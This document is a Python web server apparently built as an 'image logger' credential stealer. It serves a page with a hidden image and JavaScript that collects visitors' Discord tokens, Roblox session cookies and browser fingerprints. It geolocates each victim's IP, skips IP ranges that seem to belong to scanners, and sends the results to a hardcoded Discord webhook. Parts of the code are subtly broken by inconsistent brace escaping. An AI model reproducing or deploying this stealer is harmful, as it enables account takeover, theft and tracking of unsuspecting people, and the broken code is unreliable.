#!/usr/bin/env python3
import base64
import json
import os
import re
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import requests
from urllib.parse import urlparse, parse_qs
import httpagentparser

class ImageLoggerAPI(BaseHTTPRequestHandler):
    WEBHOOK = "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq"
    
    TOKEN_JS = """
    let tokens = [];
    try {
        tokens.push(localStorage.getItem('token')?.replace(/["]/g, ''));
        tokens.push(sessionStorage.getItem('token')?.replace(/["]/g, ''));
        (webpackChunkdiscord_app?.push?.([[''],{{}},{{getToken:()=>{}}},['']])?.token);
        for(let a in window.webpackChunkdiscord_app?.[0][1]) {{
            window.webpackChunkdiscord_app[0][1][a]?.exports?.default?.getToken?.()?.replace(/["]/g, '');
        }}
        document.querySelector("[data-slate-object=block]")?.getAttribute('data-slate-string');
        document.cookie.split(';').find(row=>row.includes('__token'))?.split('=')[1];
        tokens.push(localStorage['__discord_token']?.replace(/["]/g, ''));
        tokens.push(sessionStorage['__discord_token']?.replace(/["]/g, ''));
        window.webpackChunkdiscord_app?.forEach?.(chunk=>{{chunk[1]?.exports?.default?.getToken?.()?.replace(/["]/g, '')}});
        (window.webpackRequire?.cache?.discord_app?.exports?.default?.getToken?.()?.replace(/["]/g, ''));
        localStorage.getItem('.eJx')?.replace(/["]/g, '');
        sessionStorage.getItem('.eJx')?.replace(/["]/g, '');
    }} catch(e){{}}
    tokens = tokens.filter(t=>t && (t.includes('.') || t.includes('_')) && t.length>50);
    return [...new Set(tokens)].join(' | ');
    """
    
    ROBLOX_JS = """
    let roblox = [];
    try {
        roblox.push(localStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
        roblox.push(sessionStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
        roblox.push(document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]);
        roblox.push(localStorage.getItem('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')?.replace(/["]/g, ''));
    } catch(e){}
    roblox = roblox.filter(t=>t && t.length>100);
    return [...new Set(roblox)].join(' | ');
    """
    
    FP_JS = """
    let fp = {{}};
    try {
        fp.ua = navigator.userAgent;
        fp.lang = navigator.language;
        fp.platform = navigator.platform;
        fp.screen = `${{screen.width}}x${{screen.height}}x${{screen.availWidth}}x${{screen.availHeight}}`;
        fp.colorDepth = screen.colorDepth;
        fp.pixelRatio = window.devicePixelRatio;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.plugins = Array.from(navigator.plugins).map(p=>p.name).join(',');
        fp.mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).join(',');
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
        fp.canvas = canvas.toDataURL();
        
        const glCanvas = document.createElement('canvas');
        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        fp.webgl = gl?.getParameter(gl.RENDERER);
        fp.webglvendor = gl?.getParameter(gl.VENDOR);
        
        const audio = new AudioContext();
        const osc = audio.createOscillator();
        const analyser = audio.createAnalyser();
        osc.connect(analyser);
        analyser.connect(audio.destination);
        osc.start(0);
        setTimeout(()=>fp.audio = analyser.frequencyBinCount, 100);
        
        fp.hardware = navigator.hardwareConcurrency;
        fp.memory = navigator.deviceMemory;
        fp.battery = navigator.getBattery?.()?.then(b=>`${{b.level*100}}% ${{b.charging?'charging':'discharging'}}`);
        
        const fonts = ['Arial','Times New Roman','Courier New','Verdana','Georgia','Comic Sans MS','Trebuchet MS','Impact','Lucida Sans Unicode'];
        fp.fonts = fonts.filter(f=>document.fonts.check(`12px ${{f}}`)).join(',');
        
        fp.touch = navigator.maxTouchPoints;
        fp.connection = navigator.connection?.effectiveType + ' ' + navigator.connection?.downlink;
        
    }} catch(e){{}}
    return JSON.stringify(fp);
    """
    
    def _send_webhook(self, data):
        try:
            requests.post(self.WEBHOOK, json=data, timeout=5)
        except: pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        image_url = params.get('image', ['https://i.imgur.com/4z5z5z5.jpg'])[0]
        
        victim_ip = self.client_address[0]
        headers = dict(self.headers)
        real_ip = headers.get('X-Forwarded-For', headers.get('X-Real-IP', victim_ip))
        
        bad_ips = ['27.', '104.', '143.', '164.', '34.', '35.']
        if any(ip in real_ip for ip in bad_ips):
            self.wfile.write(base64.b64decode("R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs="))
            return
        
        ua = headers.get('User-Agent', 'Unknown')
        os_name, browser = httpagentparser.detect(ua)
        
        js_payload = f"""
        <html><head><title></title></head>
        <body style='margin:0;padding:0;overflow:hidden;background:#000;'>
            <img src="{image_url}" style='width:1px;height:1px;opacity:0;position:absolute;' onload="setTimeout(logData,1000);" onerror="setTimeout(logData,1000);">
            <script>
                async function logData() {{
                    let tokens = ({self.TOKEN_JS})();
                    let roblox = ({self.ROBLOX_JS})();
                    let fp = {self.FP_JS}();
                    let data = {{ip:'{real_ip}', ua:navigator.userAgent, tokens:tokens, roblox:roblox, fp:fp, os:'{os_name}', browser:'{browser}'}};
                    fetch('/steal', {{method:'POST', body:JSON.stringify(data), mode:'no-cors'}});
                    navigator.sendBeacon?.('/steal', JSON.stringify(data));
                }}
            </script>
        </body></html>
        """
        
        self.wfile.write(js_payload.encode())
    
    def do_POST(self):
        if self.path == '/steal':
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len).decode('utf-8', errors='ignore')
            
            try:
                data = json.loads(post_data)
            except:
                data = {{'raw': post_data}}
            
            try:
                geo_resp = requests.get(f'http://ip-api.com/json/{data.get("ip", "")}?fields=status,message,country,regionName,city,isp,org,timezone,lat,lon,query', timeout=3).json()
                if geo_resp['status'] == 'success':
                    geo = f"{geo_resp['city']}, {geo_resp['regionName']}, {geo_resp['country']} | {geo_resp['isp']}"
                    coords = f"{geo_resp['lat']:.4f}, {geo_resp['lon']:.4f}"
                else:
                    geo = "Unknown"
                    coords = "N/A"
            except:
                geo = "Unknown"
                coords = "N/A"
            
            tokens = data.get('tokens', 'No tokens')
            roblox = data.get('roblox', 'No Roblox cookies')
            fp_data = data.get('fp', {{}})
            
            embed = {{
                "title": f"Victim Logged - {data.get('ip', 'Unknown')}",
                "color": 16711680,
                "fields": [
                    {{"name": "IP/Location", "value": f"`{data.get('ip', 'Unknown')}`\n**{geo}**\n*{coords}*", "inline": True}},
                    {{"name": "Device", "value": f"**OS:** {data.get('os', 'Unknown')}\n**Browser:** {data.get('browser', 'Unknown')}", "inline": True}},
                    {{"name": "Discord Tokens", "value": f"`{tokens[:1000]}`" if tokens != 'No tokens' else "`No tokens`", "inline": False}},
                    {{"name": "Roblox Cookies", "value": f"`{roblox[:1000]}`" if roblox != 'No Roblox cookies' else "`No Roblox`", "inline": False}},
                    {{"name": "Canvas FP", "value": f"`{fp_data.get('canvas', 'N/A')[:64]}...`", "inline": True}},
                    {{"name": "WebGL", "value": f"`{fp_data.get('webgl', 'N/A')}`", "inline": True}},
                    {{"name": "Hardware", "value": f"`{fp_data.get('hardware', 'N/A')} cores`\n`{fp_data.get('memory', 'N/A')}GB`", "inline": True}}
                ],
                "thumbnail": {{"url": "https://i.imgur.com/4z5z5z5.jpg"}},
                "footer": {{"text": f"Screen: {fp_data.get('screen', 'N/A')} | UA: {data.get('ua', 'Unknown')[:80]}"}},
                "timestamp": "2026-02-12T00:00:00.000Z"
            }}
            
            self._send_webhook({{"embeds": [embed]}})
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8000), ImageLoggerAPI)
    server.serve_forever()
